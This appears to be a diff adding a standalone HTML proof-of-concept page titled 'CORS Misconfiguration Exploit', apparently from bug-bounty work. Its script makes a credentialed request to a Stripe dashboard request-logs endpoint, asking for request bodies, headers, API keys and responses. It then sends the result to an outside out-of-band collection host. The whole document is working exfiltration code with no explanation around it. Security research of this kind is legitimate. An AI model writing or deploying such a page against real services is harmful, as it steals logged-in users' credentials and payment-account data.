@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Misconfiguration Exploit</title>
+</head>
+<body>
+    <h1>CORS Misconfiguration Exploit</h1>
+    <button id="exploit">Get Data</button>
+
+    <script>
+        document.getElementById('exploit').addEventListener('click', () => {
+            fetch('https://dashboard.stripe.com/v1/request_logs?include_only%5B%5D=data.id%2Cdata.application%2Cdata.created%2Cdata.livemode%2Cdata.objects%2Cdata.request.method%2Cdata.request.url%2Cdata.request.get_params%2Cdata.request.post_params%2Cdata.request.query_string%2Cdata.request.request_body%2Cdata.request.ip%2Cdata.request.headers%2Cdata.request.client_ip%2Cdata.request.from_dashboard%2Cdata.request.from_dashboard_user%2Cdata.request.origin%2Cdata.request.key%2Cdata.response.status%2Cdata.response.headers%2Cdata.response.body%2Cdata.response.raw_body%2Cdata.success%2Chas_more&direction%5B%5D=self&direction%5B%5D=connect_in&method%5B%5D=post&method%5B%5D=delete', {
+                method: 'GET',
+                credentials: 'include'
+            })
+            .then(response => response.text())
+            .then(data => {
+                // Send the data to your Burp Collaborator
+                fetch('https://rrnogxtsrhjdoboumoqreognn6t2f2lp7.oast.fun', {
+                    method: 'POST',
+                    body: data,
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    }
+                });
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
